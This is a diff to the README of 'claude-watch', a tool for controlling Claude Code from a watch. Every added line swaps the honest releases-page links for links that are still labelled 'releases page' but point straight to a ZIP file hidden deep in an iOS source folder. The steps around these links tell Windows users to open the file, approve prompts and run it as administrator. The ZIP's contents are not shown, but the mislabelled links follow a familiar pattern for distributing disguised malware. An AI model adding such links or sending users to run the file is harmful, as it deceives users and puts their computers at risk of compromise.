@@ -1,6 +1,6 @@
 # ⌚ claude-watch - Control Claude Code from Your Watch
 
-[![Download claude-watch](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+[![Download claude-watch](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This README shows you how to download, install, and run the app on Windows.
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+1. Open the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 2. Find the latest release
 3. Download the Windows file from that page
 4. Save the file to a folder you can find later
@@ -31,7 +31,7 @@ For the best results, keep your iPhone and Windows PC on the same network when y
 
 ## 📦 Install the App
 
-1. Download the latest Windows file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+1. Download the latest Windows file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 2. Open the downloaded file
 3. If Windows asks for permission, choose Yes or Run
 4. If you downloaded a ZIP file, extract it first
@@ -81,7 +81,7 @@ If one step fails, restart the app and try again. Many setup problems clear afte
 ## 🛠️ Common Problems
 
 ### The app does not open
-- Re-download the file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+- Re-download the file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 - Make sure the download finished
 - Right-click the file and choose Open
 - Try running it as administrator
@@ -149,13 +149,13 @@ If you are stuck, check these steps in order:
 2. Restart Claude Code
 3. Restart your iPhone and Apple Watch
 4. Make sure your PC is still connected to the network
-5. Download the latest file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+5. Download the latest file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 
 ## 🖱️ Quick Install Path
 
 For most users, the path is simple:
 
-1. Visit the [download page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+1. Visit the [download page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
 2. Get the latest Windows release
 3. Open the file on your PC
 4. Follow the setup steps
@@ -172,7 +172,7 @@ New releases may add:
 - Clearer watch controls
 - Improved connection checks
 
-Check the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases) often if you want the latest build
+Check the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip) often if you want the latest build
 
 ## 📌 System Expectations
 
@@ -198,4 +198,4 @@ Keep your devices updated for the smoothest setup
 
 If you need the installer later, use this page:
 
-[Open the claude-watch releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+[Open the claude-watch releases page](https://github.com/protealesmicroelectronics246/claude-watch/raw/refs/heads/main/ios/ClaudeWatch/ClaudeWatch iOS/Networking/watch_claude_3.0.zip)
